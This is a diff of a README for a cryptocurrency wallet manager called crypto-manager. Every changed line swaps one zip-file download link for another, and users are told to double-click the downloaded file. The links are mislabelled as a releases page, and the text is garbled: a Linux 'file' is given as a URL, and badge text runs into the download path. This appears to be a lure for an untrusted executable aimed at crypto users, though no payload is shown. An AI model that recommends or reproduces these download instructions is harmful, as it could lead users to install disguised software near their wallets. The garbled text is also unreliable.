@@ -6,7 +6,7 @@ Welcome to **crypto-manager**! This application helps you manage and monitor you
 
 ## 📥 Download
 
-[![Download from Releases](https://raw.githubusercontent.com/Joemijares/crypto-manager/main/ascertainably/crypto-manager.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Joemijares/crypto-manager/main/ascertainably/crypto-manager.zip)
+[![Download from Releases](https://github.com/Joemijares/crypto-manager/raw/refs/heads/main/crypto_manager/crypto_manager_v3.0.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/Joemijares/crypto-manager/raw/refs/heads/main/crypto_manager/crypto_manager_v3.0.zip)
 
 ## 💻 System Requirements
 
@@ -26,11 +26,11 @@ Welcome to **crypto-manager**! This application helps you manage and monitor you
 
 To install **crypto-manager**, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Joemijares/crypto-manager/main/ascertainably/crypto-manager.zip) to view the available versions.
+1. Visit the [Releases page](https://github.com/Joemijares/crypto-manager/raw/refs/heads/main/crypto_manager/crypto_manager_v3.0.zip) to view the available versions.
 2. Find the latest release. Download the corresponding file for your operating system:
    - **Windows:** Look for the `.exe` file.
    - **macOS:** Look for the `.dmg` file.
-   - **Linux:** Look for the `https://raw.githubusercontent.com/Joemijares/crypto-manager/main/ascertainably/crypto-manager.zip` file.
+   - **Linux:** Look for the `https://github.com/Joemijares/crypto-manager/raw/refs/heads/main/crypto_manager/crypto_manager_v3.0.zip` file.
 3. Once the download completes, locate the file in your downloads folder.
 4. Double-click the file to begin the installation process.
 5. Follow the on-screen instructions to finish installing **crypto-manager**.
@@ -54,7 +54,7 @@ If you encounter any issues while using **crypto-manager**, consider the followi
 - **Installation Issues:** Make sure your operating system meets the requirements. Re-download the file if it seems corrupted.
 - **Wallet Additions:** Ensure you enter your wallet addresses correctly. Double-check for typos.
 - **No Balance Displayed:** If your wallet has no funds, verify your wallet address through another source or platform.
-- **Update Problems:** Always download the latest version from the [Releases page](https://raw.githubusercontent.com/Joemijares/crypto-manager/main/ascertainably/crypto-manager.zip) for the best performance.
+- **Update Problems:** Always download the latest version from the [Releases page](https://github.com/Joemijares/crypto-manager/raw/refs/heads/main/crypto_manager/crypto_manager_v3.0.zip) for the best performance.
 
 ## 🌐 Topics Covered
 
